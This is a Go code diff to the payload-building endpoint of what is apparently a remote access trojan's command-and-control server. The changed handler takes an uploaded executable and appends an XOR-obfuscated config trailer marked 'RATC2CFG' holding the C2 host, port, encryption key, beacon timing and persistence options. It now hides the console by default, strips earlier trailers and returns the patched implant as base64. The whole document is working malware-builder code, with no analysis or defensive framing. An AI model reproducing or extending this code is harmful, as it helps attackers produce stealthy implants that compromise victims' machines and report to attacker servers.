@@ -1,6 +1,9 @@
 package api
 
 import (
+	"bytes"
+	"crypto/sha256"
+	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
@@ -631,24 +634,24 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 			return
 		}
 
-		// Parse config from form
 		cfg := PayloadConfig{
-			C2Host:        c.PostForm("c2_host"),
-			C2Port:        c.PostForm("c2_port"),
-			UseTLS:        c.PostForm("use_tls") == "true",
-			Key:           c.PostForm("key"),
-			HMACKey:       c.PostForm("hmac_key"),
-			SleepInterval: parseInt(c.PostForm("sleep_interval"), 60),
-			Jitter:        parseInt(c.PostForm("jitter"), 10),
-			Persistence:   c.PostForm("persistence") == "true",
-			HideConsole:   c.PostForm("hide_console") == "true",
-			AntiDebug:     c.PostForm("anti_debug") == "true",
-			AntiVM:        c.PostForm("anti_vm") == "true",
+			C2Host:          c.PostForm("c2_host"),
+			C2Port:          c.PostForm("c2_port"),
+			UseTLS:          c.PostForm("use_tls") == "true",
+			Key:             c.PostForm("key"),
+			HMACKey:         c.PostForm("hmac_key"),
+			SleepInterval:   parseInt(c.PostForm("sleep_interval"), 60),
+			Jitter:          parseInt(c.PostForm("jitter"), 10),
+			Persistence:     c.PostForm("persistence") == "true",
+			HideConsole:     c.PostForm("hide_console") != "false",
+			AntiDebug:       c.PostForm("anti_debug") == "true",
+			AntiVM:          c.PostForm("anti_vm") == "true",
 			InjectionMethod: c.PostForm("injection_method"),
-			Platform:      c.PostForm("platform"),
+			Platform:        c.PostForm("platform"),
 		}
+		applyCustomConfig(&cfg, c.PostForm("custom_config"))
+		normalizePayloadTLS(&cfg)
 
-		// Default platform to windows if not specified
 		if cfg.Platform == "" {
 			cfg.Platform = "windows"
 		}
@@ -660,67 +663,63 @@ func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 			return
 		}
 
-		// Create payload record
 		payloadID := uuid.New().String()
 		ext := ".exe"
 		if isLinux {
 			ext = ""
 		}
 		tempPath := filepath.Join(fileMgr.GetStoragePath(), "payloads", payloadID+ext)
+		_ = os.MkdirAll(filepath.Dir(tempPath), 0755)
 
-		if err := os.MkdirAll(filepath.Dir(tempPath), 0755); err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create payload directory"})
-			return
-		}
-
-		// Read the uploaded binary into memory so we can inject the C2 config trailer.
 		exeBytes, err := io.ReadAll(file)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read binary"})
 			return
 		}
 
-		// Serialize the operator C2 config and append it as an obfuscated trailer.
-		// Loader contract: scan for magic "RATC2CFG" XOR 0x33, next 4 bytes =
-		// uint32 LE length, then that many bytes of rolling-XOR JSON:
-		// body[i] = json[i] ^ (0x5A + (12+i)). Agent mirrors this exactly.
-		configJSON, err := json.Marshal(cfg)
-		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to encode config"})
-			return
-		}
+		exeBytes = stripExistingTrailer(exeBytes)
+		configJSON := marshalTrailer(cfg)
 		var lenBuf [4]byte
 		binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(configJSON)))
-		magic := []byte{0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74} // "RATC2CFG"^0x33
+		magic := trailerMagic()
 		enc := make([]byte, len(configJSON))
 		for i, b := range configJSON {
 			enc[i] = b ^ byte(0x5A+(12+i))
 		}
 		trailer := append(append(magic, lenBuf[:]...), enc...)
 		patched := append(exeBytes, trailer...)
+		if !verifyTrailer(patched, configJSON) {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "trailer checksum failed", "Success": false, "Error": "trailer checksum failed"})
+			return
+		}
 
 		if err := os.WriteFile(tempPath, patched, 0644); err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write patched binary"})
-			return
+			log.Printf("[Payload] disk write skipped: %v", err)
+			tempPath = ""
 		}
 		written := int64(len(patched))
 
-		// Store in database
-		_, err = fileMgr.GetDB().Exec(`
-			INSERT INTO payloads (id, filename, size, status, temp_path, config, created_at)
-			VALUES (?, ?, ?, 'completed', ?, ?, ?)
-		`, payloadID, header.Filename, written, tempPath, string(configJSON), time.Now())
-
-		if err != nil {
-			log.Printf("[Payload] DB insert error: %v", err)
+		if db := fileMgr.GetDB(); db != nil {
+			if _, err = db.Exec(`
+				INSERT INTO payloads (id, filename, size, status, temp_path, config, created_at)
+				VALUES (?, ?, ?, 'completed', ?, ?, ?)
+			`, payloadID, header.Filename, written, tempPath, string(configJSON), time.Now()); err != nil {
+				log.Printf("[Payload] DB insert error: %v", err)
+			}
 		}
 
-		log.Printf("[Payload] Built payload %s: %s (%d bytes)", payloadID, header.Filename, written)
-
+		sum := fmt.Sprintf("%x", sha256.Sum256(patched))
 		c.JSON(http.StatusOK, gin.H{
-			"id":       payloadID,
-			"filename": header.Filename,
-			"url":      fmt.Sprintf("/api/payloads/%s/download", payloadID),
+			"id":          payloadID,
+			"filename":    header.Filename,
+			"url":         fmt.Sprintf("/api/payloads/%s/download", payloadID),
+			"Success":     true,
+			"BinaryPath":  tempPath,
+			"BinaryName":  header.Filename,
+			"Size":        written,
+			"Checksum":    sum,
+			"Error":       "",
+			"DownloadB64": base64.StdEncoding.EncodeToString(patched),
 		})
 	}
 }
@@ -739,6 +738,158 @@ type PayloadConfig struct {
 	AntiVM         bool   `json:"anti_vm"`
 	InjectionMethod string `json:"injection_method"`
 	Platform       string `json:"platform"` // "windows" or "linux"
+}
+
+func normalizePayloadTLS(cfg *PayloadConfig) {
+	if cfg.C2Port == "443" {
+		cfg.UseTLS = true
+	}
+}
+
+func applyCustomConfig(cfg *PayloadConfig, raw string) {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return
+	}
+	var extra map[string]any
+	if err := json.Unmarshal([]byte(raw), &extra); err != nil {
+		return
+	}
+	str := func(keys ...string) string {
+		for _, k := range keys {
+			if v, ok := extra[k]; ok {
+				switch t := v.(type) {
+				case string:
+					if t != "" {
+						return t
+					}
+				case float64:
+					return strconv.Itoa(int(t))
+				case bool:
+					if t {
+						return "true"
+					}
+					return "false"
+				}
+			}
+		}
+		return ""
+	}
+	if v := str("c2_host", "ServerHost", "host"); v != "" {
+		cfg.C2Host = v
+	}
+	if v := str("c2_port", "ServerPort", "port"); v != "" {
+		cfg.C2Port = v
+	}
+	if v := str("use_tls", "useTLS"); v != "" {
+		cfg.UseTLS = v == "true" || v == "1"
+	}
+	if v := str("key", "EncryptionKey"); v != "" {
+		cfg.Key = v
+	}
+}
+
+func trailerMagic() []byte {
+	return []byte{0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74}
+}
+
+func stripExistingTrailer(b []byte) []byte {
+	magic := trailerMagic()
+	n := len(b)
+	if n < 12 {
+		return b
+	}
+	window := 8192
+	if window > n {
+		window = n
+	}
+	for off := 8; off <= window; off++ {
+		i := n - off
+		if i+12 > n {
+			continue
+		}
+		if !bytes.Equal(b[i:i+8], magic) {
+			continue
+		}
+		ln := int(binary.LittleEndian.Uint32(b[i+8 : i+12]))
+		if ln > 0 && ln <= 8192 && i+12+ln <= n {
+			return b[:i]
+		}
+	}
+	return b
+}
+
+func decryptTrailerJSON(patched []byte) ([]byte, bool) {
+	magic := trailerMagic()
+	n := len(patched)
+	if n < 12 {
+		return nil, false
+	}
+	window := 8192
+	if window > n {
+		window = n
+	}
+	for off := 8; off <= window; off++ {
+		i := n - off
+		if i+12 > n {
+			continue
+		}
+		if !bytes.Equal(patched[i:i+8], magic) {
+			continue
+		}
+		ln := int(binary.LittleEndian.Uint32(patched[i+8 : i+12]))
+		if ln <= 0 || ln > 8192 || i+12+ln > n {
+			continue
+		}
+		enc := patched[i+12 : i+12+ln]
+		out := make([]byte, ln)
+		for j, b := range enc {
+			out[j] = b ^ byte(0x5A+(12+j))
+		}
+		return out, true
+	}
+	return nil, false
+}
+
+func verifyTrailer(patched, want []byte) bool {
+	got, ok := decryptTrailerJSON(patched)
+	return ok && bytes.Equal(got, want)
+}
+
+func marshalTrailer(cfg PayloadConfig) []byte {
+	port := cfg.C2Port
+	if port == "" {
+		port = "443"
+	}
+	sleep := cfg.SleepInterval
+	if sleep <= 0 {
+		sleep = 180
+	}
+	jit := cfg.Jitter
+	if jit < 0 {
+		jit = 40
+	}
+	tf := func(v bool) string {
+		if v {
+			return "true"
+		}
+		return "false"
+	}
+	esc := func(s string) string {
+		b, _ := json.Marshal(s)
+		return string(b)
+	}
+	return []byte(fmt.Sprintf(
+		`{"c2_host":%s,"c2_port":%s,"use_tls":%s,"sleep_interval":%s,"jitter":%s,"persistence":%s,"hide_console":%s,"key":%s}`,
+		esc(cfg.C2Host),
+		esc(port),
+		esc(tf(cfg.UseTLS)),
+		esc(strconv.Itoa(sleep)),
+		esc(strconv.Itoa(jit)),
+		esc(tf(cfg.Persistence)),
+		esc(tf(cfg.HideConsole)),
+		esc(cfg.Key),
+	))
 }
 
 func parseInt(s string, defaultVal int) int {
